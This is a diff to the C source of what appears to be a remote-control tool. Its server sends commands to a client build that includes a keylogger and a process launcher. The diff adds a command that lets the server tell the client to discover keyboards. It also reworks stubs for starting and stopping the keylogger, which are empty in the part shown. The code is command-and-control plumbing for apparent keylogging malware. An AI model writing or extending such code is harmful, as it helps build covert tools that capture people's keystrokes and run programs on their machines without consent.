@@ -7,6 +7,7 @@
 #include "networking.h"
 
 #ifdef CLIENT_BUILD
+#include "keylogging/keylogger.h"
 #include "process_launcher/process_launcher.h"
 #endif
 
@@ -21,10 +22,6 @@ int calculate_data_packet_count(const struct session_info * session_info) {
 
 void clear_process_packets(struct session_info * session_info) {
     free_linked_list(session_info->head);
-    // struct packet_data * head = malloc(sizeof(struct packet_data));
-    // head->sequence_number = 0;
-    // head->data = 0;
-    // head->next = NULL;
     session_info->head = NULL;
     session_info->data_counter = 0;
     session_info->packet_counter = 0;
@@ -85,6 +82,10 @@ bool handle_command_codes(struct session_info * session_info, const struct packe
         case RESPONSE:
             log_message("Handling Response");
             encountered_command_code = RESPONSE;
+            break;
+        case GET_KEYBOARDS:
+            log_message("Getting Keyboards\n");
+            encountered_command_code = GET_KEYBOARDS;
             break;
         case RUN_PROGRAM:
             log_message("Running Program\n");
@@ -409,13 +410,20 @@ void handle_disconnect(struct session_info * session_info) {
  *
 **/
 
-void send_start_keylogger(int fd) {
+// NOLINTNEXTLINE
+void send_start_keylogger(struct server_options * server_options) {
 
 }
 
 
-void send_stop_keylogger(int fd) {
+// NOLINTNEXTLINE
+void send_stop_keylogger(struct server_options * server_options) {
 
+}
+
+// NOLINTNEXTLINE
+void send_get_keyboards(struct server_options * server_options) {
+    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, GET_KEYBOARDS);
 }
 
 // Disconnect
@@ -609,6 +617,13 @@ void send_receive_file(const struct server_options * server_options) {
     if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
         fprintf(stderr, "F_SETFL on STDIN\n");
     }
+}
+
+// NOLINTNEXTLINE
+void handle_get_keyboards(struct session_info * session_info) {
+#ifdef CLIENT_BUILD
+    discover_keyboards(session_info);
+#endif
 }
 
 // NOLINTNEXTLINE
